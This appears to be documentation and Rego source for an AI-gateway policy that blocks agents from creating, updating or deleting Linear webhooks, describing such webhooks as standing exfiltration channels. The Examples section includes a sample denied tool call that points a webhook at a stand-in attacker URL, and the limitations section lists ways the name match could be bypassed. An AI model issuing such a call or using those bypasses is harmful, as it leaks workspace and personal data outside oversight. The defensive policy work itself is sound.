---
name: Block Linear Webhook Creation
tags:
  - linear
  - guard-webhook-persistence
  - ingress
  - webhook
  - exfiltration
  - soc2
publishedAt: 2026-07-12
description: |
  # linear / guard-webhook-persistence

  **Direction:** ingress (`tool_pre_invoke`)
  **Default:** deny on match, allow otherwise
  **Package:** `linear.ingress.guard_webhook_persistence`

  ## What it does

  Unconditionally denies any Linear tool that creates, updates, or deletes a webhook — `linear_createWebhook`, `linear_deleteWebhook`, and update variants. All other Linear tool calls pass through unchanged.

  A single `linear_createWebhook` call — a callback URL plus an event scope — converts one approved invocation into a permanent, out-of-band feed of workspace events (issues, comments, project updates, customer records) to an arbitrary URL. Once the webhook exists the gateway cannot see or inspect the data flowing through it: it is a standing exfiltration channel that survives the session, the agent, and the pipeline that created it. This is the highest-risk single tool in the Linear landscape.

  The official Linear MCP server exposes **no** webhook tools at all, so any webhook call reaching the gateway is community-sidecar traffic by definition (the `tacticlaunch/mcp-linear` server, which mirrors the full GraphQL API). Agents have no legitimate reason to stand up, retarget, or tear down a webhook, so this policy is **deny-for-everyone**: there is no group exemption and no role check. A standing exfiltration channel should never be created through an agent path — a compromised or prompt-injected agent gets a hard stop, not a permission ladder to climb. Treat every denial from this policy as a log-and-alert signal, not routine noise.

  ## Compliance alignment

  - **SOC 2 CC6.7** — supports the restriction on transmission/movement/removal of information: a webhook is a standing transmission channel that streams workspace records out to an external endpoint continuously and invisibly; blocking its creation on the agent path keeps the agent from opening an uncontrolled data-egress route.
  - **SOC 2 CC6.6** — supports boundary protection against external threats: the webhook callback delivers workspace events to an arbitrary URL outside the gateway's inspection boundary, so denying webhook creation hardens the boundary the gateway is meant to enforce.
  - **GDPR Art. 5(1)(f) / Art. 32** — supports security of processing: an agent-created webhook is an uninspectable, unlogged onward feed of personal data (assignee names, customer records, comment bodies) that undermines the integrity and confidentiality of processing.
  - **GDPR Arts. 44 / 46** — supports control over cross-border/onward transfers on the agent-visible path: a webhook to an arbitrary callback URL is an uncontrolled transfer to an unknown recipient (potentially outside the EEA), which this policy prevents from being established via the agent.

  ## Tool name matching

  The policy matches tools case-insensitively by suffix on `lower(input.resource.name)`, in **both** the verb-noun and noun-verb orderings:

  - `*createwebhook` / `*webhookcreate`
  - `*updatewebhook` / `*webhookupdate`
  - `*deletewebhook` / `*webhookdelete`

  `linear_createWebhook` and `linear_deleteWebhook` are verified names from the `tacticlaunch/mcp-linear` [TOOLS.md](https://github.com/tacticlaunch/mcp-linear/blob/main/TOOLS.md) inventory; the `update` variant is the natural GraphQL-mirroring sibling (an `updateWebhook` mutation exists in Linear's API) and is included defensively. Both orderings are matched because Linear's **underlying GraphQL mutations are named noun-verb** (`webhookCreate`, `webhookUpdate`, `webhookDelete`), and the landscape note states the tacticlaunch sidecar "mirrors the full GraphQL API" — a server that wraps those mutations more literally would present `linear_webhookCreate` rather than tacticlaunch's verb-noun `linear_createWebhook`. Matching only the verb-noun suffix would let the GraphQL-native spelling through, so both are covered.

  The DTwo gateway prefixes tool names with the configured MCP server name, and that prefix — and the separator it uses — is not standardized. Matching on the bare lowercased suffix (`createwebhook`, not `-createWebhook`) keeps the policy portable: it catches the prefixed camelCase name (`linear_createWebhook`), any separator the gateway joins with (`linear-createWebhook`, `linear.createWebhook`), a mixed-case rename, and the unprefixed name. No benign Linear tool ends in any of these suffixes — the read counterpart is `linear_getWebhooks`, which ends in `getwebhooks` and is left untouched (reading existing webhooks is useful for detection). Verify the exact names your gateway sends with the dump-input debug technique before relying on this in production.

  ## Argument shape

  None inspected. The deny is keyed entirely on the tool name — arguments (callback URL, event scope) are irrelevant because no invocation of these tools is acceptable from an agent. Calls with missing or empty `args` are still denied (fail closed on the name match alone).

  ## Examples

  ### Allowed

  ```jsonc
  {
    "input": {
      "action": "tool_pre_invoke",
      "resource": { "name": "linear_getWebhooks", "type": "tool" },
      "payload": { "name": "linear_getWebhooks", "args": {} }
    }
  }
  ```

  `allow = true`, no reason — reading existing webhooks is fine (and useful for detection).

  ### Denied

  ```jsonc
  {
    "input": {
      "action": "tool_pre_invoke",
      "resource": { "name": "linear_createWebhook", "type": "tool" },
      "payload": {
        "name": "linear_createWebhook",
        "args": { "url": "https://evil.example/hook", "resourceTypes": ["Issue", "Comment"] }
      }
    }
  }
  ```

  `allow = false`, denied with the security-review reason below.

  ## Composition

  - **`apps/linear/freeze-destructive-ops`** — the broader destructive-suffix wall (`delete*`/`archive*`/`logout*`). It also covers `linear_deleteWebhook`; this policy is the unconditional inner wall for the webhook surface specifically (creation is a persistence op, not a destructive one, so `createWebhook`/`updateWebhook` belong here). Attaching both is redundant on delete and complementary on create/update.
  - **`apps/linear/default-deny-unknown-tools`** (PF-28) — closes the rename residual: a webhook tool renamed entirely (e.g. `subscribeEvents`) would slip this suffix match but is caught by the allowlist.
  - **`apps/linear/role-gate-writes`** — the outer least-privilege write gate; this policy is the always-on inner wall for the single highest-risk surface.

  ## Known limitations

  - **Suffix anchoring, not full names.** Matching is anchored on the lowercased `createwebhook`/`updatewebhook`/`deletewebhook` suffix and its noun-verb mirror `webhookcreate`/`webhookupdate`/`webhookdelete`, so it catches prefixed and separator-joined names in either ordering. A server that *renames* the tool entirely (e.g. `subscribeToEvents`, `addWebhookEndpoint`) — where neither the create/update/delete verb nor `webhook` is the final token — would still slip past. Combined with `default-deny-unknown-tools` (PF-28) this residual is closed.
  - **Noun-verb (GraphQL-native) ordering is covered.** Linear's GraphQL mutations are `webhookCreate`/`webhookUpdate`/`webhookDelete`; the policy matches this ordering as well as tacticlaunch's verb-noun `createWebhook`. This closes a bypass where a more literal GraphQL wrapper would present the noun-verb spelling. (Red-team finding, fixed — see the `linear_webhookCreate` deny test.)
  - **Underscore-split spellings.** The suffixes are the camelCase community spellings (`createWebhook` → `createwebhook`, `webhookCreate` → `webhookcreate`). A hypothetical snake_case spelling in either ordering (`create_webhook`, `webhook_create`) would not match because the underscore breaks the suffix. No verified Linear server uses that spelling (the official server has no webhook tools; `tacticlaunch` uses camelCase; `jerhadf` exposes no webhook tools), but if your server does, add the split-form suffix.
  - **Raw GraphQL / passthrough tools.** This policy keys on the tool name, so it cannot see a `webhookCreate` mutation smuggled through a generic raw-GraphQL or API-passthrough tool. No such tool is verified in the Linear landscape note, and any unrecognized passthrough tool is caught by `default-deny-unknown-tools` (PF-28) and `deny-escape-hatches` (PF-22); attach those alongside this policy.
  - **No identity gate by design.** This policy has no `input.subject.claims` group check — all callers are denied. A standing exfiltration channel should never be created via an agent path, so there is no break-glass branch here. If you genuinely need an agent-driven integration setup, do it through an out-of-band IT/security-review process, not by exempting a group in this policy.
  - **Existing webhooks are not torn down.** This policy blocks the *creation*, *modification*, and *deletion* of webhooks via the agent; it does nothing about webhooks already registered in the workspace out of band. Audit existing webhooks in Linear's settings directly.
  - **MCP path only.** Webhooks created via Linear's web UI, native API, or a personal API token outside the gateway are outside its reach.

  > **Compliance note.** This policy supports alignment with the cited framework controls **on the MCP path only**. No policy or bundle makes an organization compliant with any framework; web-UI, native-API, and in-app access are outside the gateway's reach by design. Validate against your own compliance program before relying on it.
direction: ingress
apps:
  - linear
industries: []
bundles:
  - soc2
experimental: true
schemaVersion: 1.0.0
minimumGatewayVersion: 1.0.0b24
---

```rego
package linear.ingress.guard_webhook_persistence

# Deny-by-default: only the explicit allow rule below permits the request.
default allow := false

# Webhook-persistence surfaces. A Linear webhook is a standing outbound feed of
# workspace events to an arbitrary URL that the gateway cannot inspect once
# created — the highest-risk single tool in the Linear landscape. The official
# server exposes NO webhook tools, so any webhook call is community-sidecar
# (tacticlaunch) traffic by definition.
#
# The gateway prefixes tool names with the configured MCP server name, and that
# prefix and its separator are not standardized. We match case-insensitively on
# the bare verb-noun suffix (`createwebhook`, not `-createWebhook`) so the rule
# catches the prefixed camelCase name (`linear_createWebhook`), any separator
# (`linear-createWebhook`, `linear.createWebhook`), a mixed-case rename, and the
# unprefixed name. No benign Linear tool ends in these suffixes — the read
# counterpart is `getWebhooks` (`...getwebhooks`), which is left untouched.

# Creates a webhook (opens a standing out-of-band exfiltration channel).
is_webhook_tool if {
    endswith(lower(input.resource.name), "createwebhook")
}

# Updates a webhook (can retarget the callback URL or widen the event scope).
is_webhook_tool if {
    endswith(lower(input.resource.name), "updatewebhook")
}

# Deletes a webhook (mutating the webhook set is not an agent action).
is_webhook_tool if {
    endswith(lower(input.resource.name), "deletewebhook")
}

# Same three surfaces in GraphQL-native noun-verb order. Linear's underlying
# GraphQL mutations are named `webhookCreate`/`webhookUpdate`/`webhookDelete`,
# and the tacticlaunch sidecar "mirrors the full GraphQL API" — so a server that
# wraps the mutations more literally (or a future tool rename) can present the
# noun-verb spelling (`linear_webhookCreate`) instead of tacticlaunch's verb-noun
# spelling (`linear_createWebhook`). Match both orderings so neither slips.
# `getWebhooks` (`...getwebhooks`) still ends in none of these and is untouched.
is_webhook_tool if {
    endswith(lower(input.resource.name), "webhookcreate")
}

is_webhook_tool if {
    endswith(lower(input.resource.name), "webhookupdate")
}

is_webhook_tool if {
    endswith(lower(input.resource.name), "webhookdelete")
}

# Allow everything that is not a webhook-mutation tool.
allow if {
    not is_webhook_tool
}

# No allow rule exists for webhook tools: the deny is unconditional.
# There is deliberately no group exemption — a standing exfiltration channel
# should never be created via an agent path, for any caller.

reasons contains "Linear webhooks create a standing outbound feed of workspace events to an external URL that the gateway cannot see or inspect once created — agents are not permitted to create, update, or delete them. Set up integrations through your IT or security-review process instead of via the agent. This attempt has been flagged for security review. Contact your InfoSec team if you believe this block is a mistake." if {
    is_webhook_tool
}

reason := joined if {
    count(reasons) > 0
    reason_list := sort([r | some r in reasons])
    joined := concat("; ", reason_list)
}
```
